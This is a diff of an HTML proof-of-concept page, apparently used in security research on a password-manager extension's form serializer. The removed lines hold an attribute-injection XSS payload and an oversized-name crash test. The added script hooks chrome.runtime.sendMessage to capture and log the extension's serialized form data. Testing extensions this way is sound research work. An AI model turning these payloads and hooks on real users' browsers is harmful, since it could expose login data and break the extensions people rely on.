@@ -1,28 +1,55 @@
 <!DOCTYPE html>
 <html>
-<head><title>Login</title></head>
+<head><title>Login Page</title></head>
 <body>
-<form id="f">
-  <input name="user">
-  <input type="password" name="pass">
+<h1>Проверка</h1>
+<form id="login" action="/auth" method="POST">
+  <input name="username" type="text" placeholder="Username">
+  <input name="password" type="password" placeholder="Password">
+  <button type="submit">Login</button>
 </form>
+
 <script>
-setTimeout(() => {
-  // Попробуем инжектировать через attribute values
-  const input = document.createElement('input');
-  input.type = 'text';
-  // Если encode() в WFD serializer не экранирует кавычки:
-  input.name = 'test" onmouseover="alert(1)';
-  document.getElementById('f').appendChild(input);
-  
-  // Длинное имя атрибута (potential overflow)
-  const longInput = document.createElement('input');
-  longInput.type = 'text';
-  longInput.name = 'A'.repeat(100000);
-  document.getElementById('f').appendChild(longInput);
-  
-  console.log('[PoC] Injected. Check if KPM crashes...');
-}, 3000);
+// Ждём полной загрузки KPM content script
+window.addEventListener('load', () => {
+  setTimeout(async () => {
+    console.log('[PoC] Starting test...');
+    
+    // 1. Перехватываем WFD serialization
+    const messages = [];
+    const origSend = chrome.runtime.sendMessage;
+    
+    chrome.runtime.sendMessage = function() {
+      const msg = arguments[1];
+      if (msg && msg.payload && msg.payload.struct) {
+        messages.push(JSON.stringify(msg.payload.struct));
+        console.log('[PoC] Captured WFD struct');
+      }
+      return origSend.apply(this, arguments);
+    };
+    
+    // 2. Ждём следующей serialization
+    await new Promise(r => setTimeout(r, 5000));
+    
+    // 3. Проверяем что отправляется
+    if (messages.length > 0) {
+      console.log('[PoC] WFD data:', messages[0]);
+      console.log('[PoC] Length:', messages[0].length);
+      
+      // 4. Анализируем структуру
+      const struct = JSON.parse(messages[0]);
+      console.log('[PoC] Root tag:', struct.nodes[0][0]);
+      console.log('[PoC] Children count:', struct.nodes[0][3].length);
+    } else {
+      console.log('[PoC] No WFD messages captured');
+      console.log('[PoC] Try: 1) Reload page  2) Fill form fields');
+    }
+    
+    // 5. Восстанавливаем
+    chrome.runtime.sendMessage = origSend;
+    
+  }, 3000);
+});
 </script>
 </body>
 </html>
